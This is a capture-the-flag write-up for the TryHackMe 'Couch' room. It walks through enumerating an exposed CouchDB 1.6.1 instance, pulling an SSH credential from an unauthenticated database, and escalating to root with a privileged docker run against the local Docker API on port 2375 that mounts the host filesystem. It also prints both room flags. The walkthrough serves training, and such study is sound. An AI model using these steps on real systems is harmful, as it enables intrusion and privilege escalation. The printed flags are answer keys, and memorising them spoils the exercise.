# _Writeup Couch_

	https://tryhackme.com/room/couch
	
-------------------------------------------------------

I did some `nmap scan` but i was taking too much time so I used `rustscan` 

	PORT     STATE SERVICE VERSION
	5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
	|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
	|_http-title: Site doesn't have a title (text/plain; charset=utf-8).


=> `2`

-------------------------------------------------------------------------------
from about scan we can it's easy now :

=> `couchdb`


`port` is also there:

=> `5984`

----------------------------------------------------------------------------

now let's visit `machineIP:5984` :

we found some logs there :

	{"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}


=> `1.6.1`

----------------------------------------------------------------------------

We have the `couchdb` it's better to google then using `gobuster`

on `google` we could able to find some info 

we can visit `machineIP:5984/_utils` 

=> `_utils`

=> `_all_dbs`
---------------------------------------------------------------------------
on there you can find a page and a tab `secrete` 
there you can `passwordbackup` and fially we got `user:password`

	passwordbackup
		
	atena:t4qfzcc4qN##

=> `atena:t4qfzcc4qN##`

-----------------------------------------------------------------

I tried connecting it with `ssh` and i got success:

																														     
	┌──(astute㉿kali)-[~/ctf/wordlists]
	└─$ ssh atena@10.10.5.163                                                                                                                                                                                                              130 ⨯
	The authenticity of host '10.10.5.163 (10.10.5.163)' can't be established.
	ECDSA key fingerprint is SHA256:TtfUUNS6Ivob4iQ7X414863lCCc1q2YyzzycIkRTZ3k.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '10.10.5.163' (ECDSA) to the list of known hosts.
	atena@10.10.5.163's password: 
	Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic)

	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage
	Last login: Fri Dec 18 15:25:27 2020 from 192.168.85.1
	atena@ubuntu:~$ 


-------------------------------------------------------------------------------


	atena@ubuntu:~$ ls
	user.txt
	atena@ubuntu:~$ cat user.txt 
	THM{1ns3cure_couchdb}
	atena@ubuntu:~$ 


we got user `flag` :

=> `THM{1ns3cure_couchdb}`

----------------------------------------------------------------------
i tried to see some `SUID` perms but when i see bash_history `cat .bash_history` i found jackpot

there was command history to open `root.txt` file and i used exact code to get into `root`

	nano root.txt
	exit
	sudo deluser USERNAME sudo
	sudo deluser atena sudo
	exit
	sudo -s
	docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
	uname -a
	exit
	atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine


	/ # 
	/ # whoami
	root


now i am `root` so for finding `root.txt` i fired up command :

`find / -type f -name root.txt 2>dev/null`

	/ # find / -type f -name root.txt 2>/dev/null
	/mnt/root/root.txt
	/ # cat /mnt/root/root.txt 
	THM{RCE_us1ng_Docker_API}
	/ # 

=> `THM{RCE_us1ng_Docker_API}`


-----------------------------------------------------------------------
# _Thank You_
